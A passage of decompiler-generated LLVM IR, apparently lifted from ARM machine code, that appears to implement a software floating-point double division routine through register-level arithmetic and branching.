  %v6_180f4 = icmp eq i32 %v5_180f4, 0
  br i1 %v6_180f4, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_180f8 = udiv i32 %arg4, 1048576
  %v6_180f8 = urem i32 %v5_180f8, 2048
  store i32 %v6_180f8, i32* %r5.global-to-local, align 4
  %v7_180f8 = icmp eq i32 %v6_180f8, 0
  br i1 %v7_180f8, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_18284

bb90:                                             ; preds = %bb
  %v5_180fc = icmp eq i32 %v5_180f4, 2047
  br i1 %v5_180fc, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_180f8, %bb90 ]
  br label %dec_label_pc_18284

bb91:                                             ; preds = %bb90
  %v5_18100 = icmp eq i32 %v6_180f8, 2047
  br i1 %v5_18100, label %dec_label_pc_18284, label %dec_label_pc_18108

dec_label_pc_18108:                               ; preds = %bb91
  %v2_18108 = sub nsw i32 %v5_180f4, %v6_180f8
  store i32 %v2_18108, i32* %r4.global-to-local, align 4
  %v2_1810c = xor i32 %v1_180f4, %arg4
  %v4_18110 = mul i32 %arg4, 4096
  %v5_18110 = or i32 %v4_18110, %arg3
  store i32 %v5_18110, i32* %r5.global-to-local, align 4
  %v7_18110 = icmp eq i32 %v5_18110, 0
  %v3_18114 = mul i32 %v1_180f4, 4096
  store i32 %v3_18114, i32* %r1.global-to-local, align 4
  br i1 %v7_18110, label %dec_label_pc_18250, label %dec_label_pc_1811c

dec_label_pc_1811c:                               ; preds = %dec_label_pc_18108
  %tmp92 = mul i32 %arg4, 256
  %v4_18124 = and i32 %tmp92, 268435200
  %v4_18128 = udiv i32 %arg3, 16777216
  %v5_18124 = or i32 %v4_18128, %v4_18124
  %v5_18128 = or i32 %v5_18124, 268435456
  store i32 %v5_18128, i32* %r3.global-to-local, align 4
  %v3_1812c = mul i32 %arg3, 256
  store i32 %v3_1812c, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_180f4, 256
  %v4_18130 = and i32 %tmp93, 268435200
  %v1_18134 = load i32, i32* @r0, align 4
  %v4_18134 = udiv i32 %v1_18134, 16777216
  %v5_18130 = or i32 %v4_18130, %v4_18134
  %v5_18134 = or i32 %v5_18130, 268435456
  store i32 %v5_18134, i32* %r5.global-to-local, align 4
  %v3_18138 = mul i32 %v1_18134, 256
  store i32 %v3_18138, i32* %r6.global-to-local, align 4
  %v1_1813c = and i32 %v2_1810c, -2147483648
  store i32 %v1_1813c, i32* %r1.global-to-local, align 4
  %v3_18140 = icmp uge i32 %v5_18134, %v5_18128
  %v9_18140 = icmp eq i32 %v5_18134, %v5_18128
  br i1 %v9_18140, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1811c
  %v4_18144 = icmp uge i32 %v3_18138, %v3_1812c
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1811c, %bb94
  %v1_18148 = phi i1 [ %v3_18140, %dec_label_pc_1811c ], [ %v4_18144, %bb94 ]
  %v2_18148 = add nsw i32 %v2_18108, 253
  %v3_18148 = zext i1 %v1_18148 to i32
  %v4_18148 = add nsw i32 %v2_18148, %v3_18148
  %v8_18148 = icmp ule i32 %v4_18148, %v2_18108
  %v9_18148 = icmp ugt i32 %v2_18108, -254
  %v10_18148 = select i1 %v1_18148, i1 %v8_18148, i1 %v9_18148
  %v1_1814c = add nsw i32 %v4_18148, 768
  store i32 %v1_1814c, i32* %r4.global-to-local, align 4
  br i1 %v10_18148, label %dec_label_pc_1815c, label %dec_label_pc_18154

dec_label_pc_18154:                               ; preds = %bb95
  %v3_18154 = udiv i32 %v5_18128, 2
  store i32 %v3_18154, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1815c

dec_label_pc_1815c:                               ; preds = %bb95, %dec_label_pc_18154
  %v0_18164 = phi i32 [ %v5_18128, %bb95 ], [ %v3_18154, %dec_label_pc_18154 ]
  %v0_18168 = phi i32 [ %v3_1812c, %bb95 ], [ 0, %dec_label_pc_18154 ]
  %v2_1815c = sub i32 %v3_18138, %v0_18168
  store i32 %v2_1815c, i32* %r6.global-to-local, align 4
  %v3_1815c = icmp uge i32 %v3_18138, %v0_18168
  %v3_18160 = icmp eq i1 %v3_1815c, false
  %v4_18160 = sub nsw i32 %v5_18134, %v0_18164
  %v6_18160 = sext i1 %v3_18160 to i32
  %v7_18160 = add nsw i32 %v6_18160, %v4_18160
  store i32 %v7_18160, i32* %r5.global-to-local, align 4
  %v3_18164 = udiv i32 %v0_18164, 2
  store i32 %v3_18164, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18174.outer

dec_label_pc_18174.outer:                         ; preds = %dec_label_pc_1820c, %dec_label_pc_1815c
  %v1_18220.ph = phi i32 [ %v2_1820c, %dec_label_pc_1820c ], [ %v1_1813c, %dec_label_pc_1815c ]
  %v0_18178.ph = phi i32 [ %v5_181e8, %dec_label_pc_1820c ], [ %v7_18160, %dec_label_pc_1815c ]
  %v1_1817c.ph = phi i32 [ %v3_181ec, %dec_label_pc_1820c ], [ %v2_1815c, %dec_label_pc_1815c ]
  %v5_181f417.ph = phi i32 [ %v5_181f4, %dec_label_pc_1820c ], [ %v3_18164, %dec_label_pc_1815c ]
  %v3_181f813.ph = phi i32 [ %v3_181f8, %dec_label_pc_1820c ], [ 0, %dec_label_pc_1815c ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1820c ], [ 1048576, %dec_label_pc_1815c ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1820c ], [ 524288, %dec_label_pc_1815c ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18174

dec_label_pc_18174:                               ; preds = %dec_label_pc_18174.outer, %dec_label_pc_181e4
  %v1_181d859 = phi i32 [ %v2_18220, %dec_label_pc_181e4 ], [ %storemerge133, %dec_label_pc_18174.outer ]
  %v1_18184 = phi i32 [ %v1_1818432, %dec_label_pc_181e4 ], [ %storemerge133, %dec_label_pc_18174.outer ]
  %v1_181a041 = phi i32 [ %v1_181a043, %dec_label_pc_181e4 ], [ %storemerge133, %dec_label_pc_18174.outer ]
  %v1_181bc50 = phi i32 [ %v1_181bc52, %dec_label_pc_181e4 ], [ %storemerge133, %dec_label_pc_18174.outer ]
  %v0_181fc = phi i32 [ %v3_181fc, %dec_label_pc_181e4 ], [ %storemerge, %dec_label_pc_18174.outer ]
  %v0_18178 = phi i32 [ %v5_181e8, %dec_label_pc_181e4 ], [ %v0_18178.ph, %dec_label_pc_18174.outer ]
  %v1_1817c = phi i32 [ %v3_181ec, %dec_label_pc_181e4 ], [ %v1_1817c.ph, %dec_label_pc_18174.outer ]
  %v5_181f417 = phi i32 [ %v5_181f4, %dec_label_pc_181e4 ], [ %v5_181f417.ph, %dec_label_pc_18174.outer ]
  %v3_181f813 = phi i32 [ %v3_181f8, %dec_label_pc_181e4 ], [ %v3_181f813.ph, %dec_label_pc_18174.outer ]
  %v3_18174 = icmp uge i32 %v1_1817c, %v3_181f813
  %v3_18178 = icmp eq i1 %v3_18174, false
  %v4_18178 = sub i32 %v0_18178, %v5_181f417
  %v6_18178 = sext i1 %v3_18178 to i32
  %v7_18178 = add i32 %v6_18178, %v4_18178
  %v8_18178 = zext i1 %v3_18178 to i32
  %v9_18178 = sub i32 %v7_18178, %v8_18178
  %v10_18178 = icmp ult i32 %v0_18178, %v9_18178
  %v11_18178 = icmp ne i32 %v5_181f417, -1
  %v12_18178 = or i1 %v11_18178, %v10_18178
  %v13_18178 = icmp ult i32 %v0_18178, %v5_181f417
  %v14_18178 = select i1 %v3_18178, i1 %v12_18178, i1 %v13_18178
  br i1 %v14_18178, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_18174
  %v3_1817c = sub i32 %v1_1817c, %v3_181f813
  store i32 %v3_1817c, i32* %r6.global-to-local, align 4
  store i32 %v7_18178, i32* %r5.global-to-local, align 4
  %v3_18184 = or i32 %v1_18184, %v0_181fc
  store i32 %v3_18184, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_18174, %bb96
  %v1_181d858 = phi i32 [ %v1_181d859, %dec_label_pc_18174 ], [ %v3_18184, %bb96 ]
  %v1_1818435 = phi i32 [ %v1_18184, %dec_label_pc_18174 ], [ %v3_18184, %bb96 ]
  %v1_181a0 = phi i32 [ %v1_181a041, %dec_label_pc_18174 ], [ %v3_18184, %bb96 ]
  %v1_181bc49 = phi i32 [ %v1_181bc50, %dec_label_pc_18174 ], [ %v3_18184, %bb96 ]
  %v0_18194 = phi i32 [ %v0_18178, %dec_label_pc_18174 ], [ %v7_18178, %bb96 ]
  %v1_18198 = phi i32 [ %v1_1817c, %dec_label_pc_18174 ], [ %v3_1817c, %bb96 ]
  %v1_18188 = urem i32 %v5_181f417, 2
  %v2_18188 = icmp ne i32 %v1_18188, 0
  %v3_18188 = udiv i32 %v5_181f417, 2
  %v3_1818c = zext i1 %v2_18188 to i32
  %v6_1818c = zext i32 %v3_181f813 to i64
  %v7_1818c = sub i32 33, %v3_181f813
  %v8_1818c = zext i32 %v7_1818c to i64
  %v9_1818c = shl i64 %v6_1818c, %v8_1818c
  %v10_1818c = sub i32 32, %v3_181f813
  %v11_1818c = shl i32 %v3_1818c, %v10_1818c
  %v12_1818c = zext i32 %v11_1818c to i64
  %v14_1818c = or i64 %v12_1818c, %v9_1818c
  %v15_1818c = trunc i64 %v14_1818c to i32
  %v3_18190 = icmp uge i32 %v1_18198, %v15_1818c
  %v3_18194 = icmp eq i1 %v3_18190, false
  %v4_18194 = sub i32 %v0_18194, %v3_18188
  %v6_18194 = sext i1 %v3_18194 to i32
  %v7_18194 = add i32 %v6_18194, %v4_18194
  %v13_18194 = icmp ult i32 %v0_18194, %v3_18188
  %v14_18194 = or i1 %v13_18194, %v3_18194
  br i1 %v14_18194, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_18198 = sub i32 %v1_18198, %v15_1818c
  store i32 %v3_18198, i32* %r6.global-to-local, align 4
  store i32 %v7_18194, i32* %r5.global-to-local, align 4
  %v5_181a0 = udiv i32 %v0_181fc, 2
  %v6_181a0 = or i32 %v1_181a0, %v5_181a0
  store i32 %v6_181a0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_181d857 = phi i32 [ %v1_181d858, %.thread4 ], [ %v6_181a0, %bb97 ]
  %v1_1818434 = phi i32 [ %v1_1818435, %.thread4 ], [ %v6_181a0, %bb97 ]
  %v1_181a045 = phi i32 [ %v1_181a0, %.thread4 ], [ %v6_181a0, %bb97 ]
  %v1_181bc = phi i32 [ %v1_181bc49, %.thread4 ], [ %v6_181a0, %bb97 ]
  %v0_181b0 = phi i32 [ %v0_18194, %.thread4 ], [ %v7_18194, %bb97 ]
  %v1_181b4 = phi i32 [ %v1_18198, %.thread4 ], [ %v3_18198, %bb97 ]
  %v1_181a4 = urem i32 %v3_18188, 2
  %v2_181a4 = icmp ne i32 %v1_181a4, 0
  %v3_181a4 = udiv i32 %v5_181f417, 4
  %v3_181a8 = zext i1 %v2_181a4 to i32
  %v6_181a8 = and i64 %v14_1818c, 4294967295
  %v7_181a8 = sub i32 33, %v15_1818c
  %v8_181a8 = zext i32 %v7_181a8 to i64
  %v9_181a8 = shl i64 %v6_181a8, %v8_181a8
  %v10_181a8 = sub i32 32, %v15_1818c
  %v11_181a8 = shl i32 %v3_181a8, %v10_181a8
  %v12_181a8 = zext i32 %v11_181a8 to i64
  %v14_181a8 = or i64 %v12_181a8, %v9_181a8
  %v15_181a8 = trunc i64 %v14_181a8 to i32
  %v3_181ac = icmp uge i32 %v1_181b4, %v15_181a8
  %v3_181b0 = icmp eq i1 %v3_181ac, false
  %v4_181b0 = sub i32 %v0_181b0, %v3_181a4
  %v6_181b0 = sext i1 %v3_181b0 to i32
  %v7_181b0 = add i32 %v6_181b0, %v4_181b0
  %v13_181b0 = icmp ult i32 %v0_181b0, %v3_181a4
  %v14_181b0 = or i1 %v13_181b0, %v3_181b0
  br i1 %v14_181b0, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_181b4 = sub i32 %v1_181b4, %v15_181a8
  store i32 %v3_181b4, i32* %r6.global-to-local, align 4
  store i32 %v7_181b0, i32* %r5.global-to-local, align 4
  %v5_181bc = udiv i32 %v0_181fc, 4
  %v6_181bc = or i32 %v1_181bc, %v5_181bc
  store i32 %v6_181bc, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_181d8 = phi i32 [ %v1_181d857, %.thread6 ], [ %v6_181bc, %bb98 ]
  %v1_1818433 = phi i32 [ %v1_1818434, %.thread6 ], [ %v6_181bc, %bb98 ]
  %v1_181a044 = phi i32 [ %v1_181a045, %.thread6 ], [ %v6_181bc, %bb98 ]
  %v1_181bc53 = phi i32 [ %v1_181bc, %.thread6 ], [ %v6_181bc, %bb98 ]
  %v0_181cc = phi i32 [ %v0_181b0, %.thread6 ], [ %v7_181b0, %bb98 ]
  %v1_181d0 = phi i32 [ %v1_181b4, %.thread6 ], [ %v3_181b4, %bb98 ]
  %v1_181c0 = urem i32 %v3_181a4, 2
  %v2_181c0 = icmp ne i32 %v1_181c0, 0
  %v3_181c0 = udiv i32 %v5_181f417, 8
  %v3_181c4 = zext i1 %v2_181c0 to i32
  %v6_181c4 = and i64 %v14_181a8, 4294967295
  %v7_181c4 = sub i32 33, %v15_181a8
  %v8_181c4 = zext i32 %v7_181c4 to i64
  %v9_181c4 = shl i64 %v6_181c4, %v8_181c4
  %v10_181c4 = sub i32 32, %v15_181a8
  %v11_181c4 = shl i32 %v3_181c4, %v10_181c4
  %v12_181c4 = zext i32 %v11_181c4 to i64
  %v14_181c4 = or i64 %v12_181c4, %v9_181c4
  %v15_181c4 = trunc i64 %v14_181c4 to i32
  %v3_181c8 = icmp uge i32 %v1_181d0, %v15_181c4
  %v3_181cc = icmp eq i1 %v3_181c8, false
  %v4_181cc = sub i32 %v0_181cc, %v3_181c0
  %v6_181cc = sext i1 %v3_181cc to i32
  %v7_181cc = add i32 %v6_181cc, %v4_181cc
  %v13_181cc = icmp ult i32 %v0_181cc, %v3_181c0
  %v14_181cc = or i1 %v13_181cc, %v3_181cc
  br i1 %v14_181cc, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_181d0 = sub i32 %v1_181d0, %v15_181c4
  store i32 %v3_181d0, i32* %r6.global-to-local, align 4
  store i32 %v7_181cc, i32* %r5.global-to-local, align 4
  %v5_181d8 = udiv i32 %v0_181fc, 8
  %v6_181d8 = or i32 %v1_181d8, %v5_181d8
  store i32 %v6_181d8, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_181e8 = phi i32 [ %v1_181d0, %.thread8 ], [ %v3_181d0, %bb100 ]
  %v0_181e4 = phi i32 [ %v0_181cc, %.thread8 ], [ %v7_181cc, %bb100 ]
  %v2_18220 = phi i32 [ %v1_181d8, %.thread8 ], [ %v6_181d8, %bb100 ]
  %v1_1818432 = phi i32 [ %v1_1818433, %.thread8 ], [ %v6_181d8, %bb100 ]
  %v1_181a043 = phi i32 [ %v1_181a044, %.thread8 ], [ %v6_181d8, %bb100 ]
  %v1_181bc52 = phi i32 [ %v1_181bc53, %.thread8 ], [ %v6_181d8, %bb100 ]
  %v2_181dc = or i32 %v0_181e4, %v1_181e8
  %v4_181dc = icmp eq i32 %v2_181dc, 0
  br i1 %v4_181dc, label %dec_label_pc_1821c, label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %.thread10
  %v3_181e4 = mul i32 %v0_181e4, 16
  %v4_181e8 = udiv i32 %v1_181e8, 268435456
  %v5_181e8 = or i32 %v3_181e4, %v4_181e8
  store i32 %v5_181e8, i32* %r5.global-to-local, align 4
  %v3_181ec = mul i32 %v1_181e8, 16
  store i32 %v3_181ec, i32* %r6.global-to-local, align 4
  %v3_181f0 = mul nuw i32 %v3_181c0, 8
  %v4_181f4 = udiv i32 %v15_181c4, 536870912
  %v5_181f4 = or i32 %v4_181f4, %v3_181f0
  %v3_181f8 = mul i32 %v15_181c4, 8
  %v3_181fc = udiv i32 %v0_181fc, 16
  store i32 %v3_181fc, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_181fc, 16
  br i1 %tmp, label %dec_label_pc_18204, label %dec_label_pc_18174

dec_label_pc_18204:                               ; preds = %dec_label_pc_181e4
  %v1_18204 = and i32 %v1_18220.ph, 1048576
  %v2_18204 = icmp eq i32 %v1_18204, 0
  br i1 %v2_18204, label %dec_label_pc_1820c, label %.thread11.loopexit

dec_label_pc_1820c:                               ; preds = %dec_label_pc_18204
  %v2_1820c = or i32 %v2_18220, %v1_18220.ph
  store i32 %v2_1820c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18174.outer

dec_label_pc_1821c:                               ; preds = %.thread10
  store i32 %v15_181c4, i32* %r2.global-to-local, align 4
  store i32 %v3_181c0, i32* %r3.global-to-local, align 4
  %v1_1821c = and i32 %v1_18220.ph, 1048576
  %v2_1821c = icmp eq i32 %v1_1821c, 0
  br i1 %v2_1821c, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1821c
  %v3_18220 = or i32 %v2_18220, %v1_18220.ph
  store i32 %v3_18220, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_18204
  store i32 %v3_181f8, i32* %r2.global-to-local, align 4
  store i32 %v5_181f4, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1821c, %bb101
  %v1_18228 = add nsw i32 %v4_18148, 515
  store i32 %v1_18228, i32* %ip.global-to-local, align 4
  %v2_18228 = icmp ugt i32 %v1_1814c, 252
  %v7_18228 = icmp eq i32 %v1_1814c, 253
  %v2_1822c = xor i1 %v7_18228, true
  %v3_1822c = and i1 %v2_18228, %v2_1822c
  br i1 %v3_1822c, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1822c = icmp ugt i32 %v1_18228, 1791
  %v11_1822c = icmp eq i32 %v1_18228, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_18230 = phi i1 [ %v7_18228, %.thread11 ], [ %v11_1822c, %bb102 ]
  %v0_18230 = phi i1 [ %v2_18228, %.thread11 ], [ %v6_1822c, %bb102 ]
  %v2_18230 = xor i1 %v1_18230, true
  %v3_18230 = and i1 %v0_18230, %v2_18230
  call void @__pseudo_cond_branch(i1 %v3_18230, i32 ptrtoint (i32* @global_var_17f44.959 to i32))
  %v0_18234 = load i32, i32* %r5.global-to-local, align 4
  %v1_18234 = load i32, i32* %r3.global-to-local, align 4
  %v2_18234 = sub i32 %v0_18234, %v1_18234
  store i32 %v2_18234, i32* %ip.global-to-local, align 4
  %v3_18234 = icmp uge i32 %v0_18234, %v1_18234
  %v9_18234 = icmp eq i32 %v0_18234, %v1_18234
  br i1 %v9_18234, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_18238 = load i32, i32* %r6.global-to-local, align 4
  %v2_18238 = load i32, i32* %r2.global-to-local, align 4
  %v3_18238 = sub i32 %v1_18238, %v2_18238
  store i32 %v3_18238, i32* %ip.global-to-local, align 4
  %v4_18238 = icmp uge i32 %v1_18238, %v2_18238
  %v10_18238 = icmp eq i32 %v1_18238, %v2_18238
  br i1 %v10_18238, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1823c = load i32, i32* %r0.global-to-local, align 4
  %v2_1823c = urem i32 %v1_1823c, 2
  %v3_1823c = icmp ne i32 %v2_1823c, 0
  %v4_1823c = udiv i32 %v1_1823c, 2
  store i32 %v4_1823c, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_18240 = phi i1 [ %v3_18234, %bb103 ], [ %v4_18238, %bb104 ], [ %v3_1823c, %bb105 ]
  %v0_18240 = load i32, i32* %r0.global-to-local, align 4
  %v2_18240 = zext i1 %v1_18240 to i32
  %v3_18240 = add i32 %v2_18240, %v0_18240
  store i32 %v3_18240, i32* %r0.global-to-local, align 4
  %v0_18244 = load i32, i32* %r1.global-to-local, align 4
  %v1_18244 = load i32, i32* %r4.global-to-local, align 4
  %v2_18244 = and i32 %v1_18244, 4096
  %v3_18244 = icmp ne i32 %v2_18244, 0
  %v4_18244 = mul i32 %v1_18244, 1048576
  %v6_18244 = add i32 %v4_18244, %v0_18244
  %v7_18244 = zext i1 %v3_18244 to i32
  %v8_18244 = add i32 %v7_18244, %v6_18244
  store i32 %v8_18244, i32* %r1.global-to-local, align 4
  %v2_18248 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18248, i32* %r4.global-to-local, align 4
  store i32 %v6_180e8, i32* %r5.global-to-local, align 4
  store i32 %v9_180e8, i32* %r6.global-to-local, align 4
  ret i32 %v3_18240

dec_label_pc_18250:                               ; preds = %dec_label_pc_18108
  %v1_18250 = and i32 %v2_1810c, -2147483648
  %v4_18254 = urem i32 %v1_180f4, 1048576
  %v5_18254 = or i32 %v1_18250, %v4_18254
  store i32 %v5_18254, i32* %r1.global-to-local, align 4
  %v6_18258 = add nsw i32 %v2_18108, 1023
  store i32 %v6_18258, i32* %r4.global-to-local, align 4
  %v8_18258 = sub nsw i32 0, %v2_18108
  %v9_18258 = and i32 %v6_18258, %v8_18258
  %v11_18258 = icmp slt i32 %v2_18108, -1023
  %v12_18258 = icmp eq i32 %v6_18258, 0
  %v7_1825c = icmp sgt i32 %v2_18108, -1023
  br i1 %v7_1825c, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_18250
  %v10_1825c = sub nsw i32 1024, %v2_18108
  store i32 %v10_1825c, i32* %r5.global-to-local, align 4
  %v14_1825c = and i32 %v10_1825c, %v6_18258
  %v16_1825c = icmp slt i32 %v10_1825c, 0
  %v17_1825c = icmp eq i32 %v6_18258, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_18250, %bb106
  %v3_18268.in = phi i32 [ %v9_18258, %dec_label_pc_18250 ], [ %v14_1825c, %bb106 ]
  %v2_18268 = phi i1 [ %v11_18258, %dec_label_pc_18250 ], [ %v16_1825c, %bb106 ]
  %v1_18268 = phi i1 [ %v12_18258, %dec_label_pc_18250 ], [ %v17_1825c, %bb106 ]
  %v3_18268 = icmp slt i32 %v3_18268.in, 0
  %v3_18260 = xor i1 %v3_18268, %v2_18268
  %v4_18260 = or i1 %v1_18268, %v3_18260
  br i1 %v4_18260, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1826084 = mul i32 %v6_18258, 1048576
  %v10_1826085 = or i32 %v9_1826084, %v5_18254
  store i32 %v10_1826085, i32* %r1.global-to-local, align 4
  store i32 %v3_180e8, i32* %r4.global-to-local, align 4
  store i32 %v6_180e8, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_18268 = phi i32 [ %v12_180e8, %bb108 ], [ %v1_18250, %bb107 ]
  %v6_18268 = xor i1 %v4_18260, true
  call void @__pseudo_cond_branch(i1 %v6_18268, i32 %v0_18268)
  %v0_1826c = load i32, i32* %r1.global-to-local, align 4
  %v1_1826c = or i32 %v0_1826c, 1048576
  store i32 %v1_1826c, i32* @r1, align 4
  %v0_18274 = load i32, i32* %r4.global-to-local, align 4
  %v1_18274 = add i32 %v0_18274, -1
  store i32 %v1_18274, i32* @r4, align 4
  %v3_18274 = sub i32 0, %v0_18274
  %v4_18274 = and i32 %v0_18274, %v3_18274
  %v5_18274 = icmp slt i32 %v4_18274, 0
  store i1 %v5_18274, i1* @cpsr_v, align 1
  %v6_18274 = icmp slt i32 %v1_18274, 0
  store i1 %v6_18274, i1* @cpsr_n, align 1
  %v7_18274 = icmp eq i32 %v0_18274, 1
  store i1 %v7_18274, i1* @cpsr_z, align 1
  %v0_18278 = call i32 @function_17f44()
  store i32 %v0_18278, i32* @r0, align 4
  %v0_18280 = call i32 @function_17f44()
  store i32 %v0_18280, i32* @r0, align 4
  %v0_18284.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_18288.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18284

dec_label_pc_18284:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_18284.pre-phi = phi i32 [ %v5_180f8, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_180f8, %bb91 ], [ %v5_180f8, %.thread ]
  %v0_18288 = phi i32 [ %v5_180f4, %.thread1 ], [ %v5_180f4, %.thread2 ], [ %v5_180f4, %bb91 ], [ %v0_18288.pre, %.thread ]
  %v2_1828c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_18284.pre, %.thread ]
  %v5_18284 = and i32 %v2_1828c, %v4_18284.pre-phi
  store i32 %v5_18284, i32* @r5, align 4
  %v4_18288 = icmp eq i32 %v2_1828c, %v0_18288
  br i1 %v4_18288, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_18284
  %v5_1828c = icmp eq i32 %v5_18284, %v2_1828c
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_18284, %bb109
  %v0_18290 = phi i1 [ false, %dec_label_pc_18284 ], [ %v5_1828c, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_18290, i32 ptrtoint (i32* @global_var_180d8.961 to i32))
  %v0_18294 = load i32, i32* @r4, align 4
  %v1_18294 = load i32, i32* %ip.global-to-local, align 4
  %v4_18294 = icmp eq i32 %v1_18294, %v0_18294
  br i1 %v4_18294, label %dec_label_pc_1829c, label %dec_label_pc_182b8

dec_label_pc_1829c:                               ; preds = %bb110
  %v0_1829c = load i32, i32* @r0, align 4
  %v1_1829c = load i32, i32* @r1, align 4
  %v4_1829c = mul i32 %v1_1829c, 4096
  %v5_1829c = or i32 %v4_1829c, %v0_1829c
  store i32 %v5_1829c, i32* %r4.global-to-local, align 4
  %v1_182a0 = icmp ne i32 %v5_1829c, 0
  call void @__pseudo_cond_branch(i1 %v1_182a0, i32 ptrtoint (i32* @global_var_180d8.961 to i32))
  %v0_182a4 = load i32, i32* @r5, align 4
  %v1_182a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_182a8 = icmp ne i32 %v1_182a4, %v0_182a4
  call void @__pseudo_cond_branch(i1 %v1_182a8, i32 ptrtoint (i32* @global_var_180bc.962 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_182b4 = call i32 @function_180d8(i32 %arg3, i32 %arg4)
  store i32 %v2_182b4, i32* @r0, align 4
  %v1_182b8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_182b8

dec_label_pc_182b8:                               ; preds = %bb110, %dec_label_pc_1829c
  %v1_182b8 = phi i32 [ %v1_18294, %bb110 ], [ %v1_182b8.pre, %dec_label_pc_1829c ]
  %v0_182b8 = load i32, i32* @r5, align 4
  %v4_182b8 = icmp eq i32 %v0_182b8, %v1_182b8
  br i1 %v4_182b8, label %dec_label_pc_182c0, label %dec_label_pc_182b8.dec_label_pc_182d4_crit_edge

dec_label_pc_182b8.dec_label_pc_182d4_crit_edge:  ; preds = %dec_label_pc_182b8
  %v0_182d4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_182d4

dec_label_pc_182c0:                               ; preds = %dec_label_pc_182b8
  %v4_182c0 = mul i32 %arg4, 4096
  %v5_182c0 = or i32 %v4_182c0, %arg3
  store i32 %v5_182c0, i32* %r5.global-to-local, align 4
  %v7_182c0 = icmp eq i32 %v5_182c0, 0
  call void @__pseudo_cond_branch(i1 %v7_182c0, i32 ptrtoint (i32* @global_var_1806c.963 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_182d0 = call i32 @function_180d8(i32 %arg3, i32 %arg4)
  store i32 %v2_182d0, i32* @r0, align 4
  br label %dec_label_pc_182d4

dec_label_pc_182d4:                               ; preds = %dec_label_pc_182b8.dec_label_pc_182d4_crit_edge, %dec_label_pc_182c0
  %v0_182d4 = phi i32 [ %v0_182d4.pre, %dec_label_pc_182b8.dec_label_pc_182d4_crit_edge ], [ %v2_182d0, %dec_label_pc_182c0 ]
  %v1_182d4 = load i32, i32* @r1, align 4
  %v3_182d4 = mul i32 %v1_182d4, 2
  %v4_182d4 = or i32 %v3_182d4, %v0_182d4
  store i32 %v4_182d4, i32* %r6.global-to-local, align 4
  %v6_182d4 = icmp eq i32 %v4_182d4, 0
  br i1 %v6_182d4, label %dec_label_pc_182d4._crit_edge, label %bb111

dec_label_pc_182d4._crit_edge:                    ; preds = %dec_label_pc_182d4
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_182d4
  %v4_182d8 = mul i32 %arg4, 2
  %v5_182d8 = or i32 %v4_182d8, %arg3
  store i32 %v5_182d8, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_182d8, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_182d4._crit_edge, %bb111
